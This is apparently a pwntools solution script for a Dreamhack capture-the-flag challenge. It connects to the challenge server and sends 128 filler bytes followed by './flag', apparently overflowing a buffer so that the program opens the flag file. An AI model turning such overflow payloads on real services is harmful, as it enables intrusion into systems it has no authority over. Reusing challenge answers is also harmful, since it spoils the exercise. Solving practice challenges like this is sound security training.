from pwn import *

p = remote('host8.dreamhack.games', 24232)

payload = b'A'*128
payload += b'./flag'

p.sendline(payload)

p.interactive()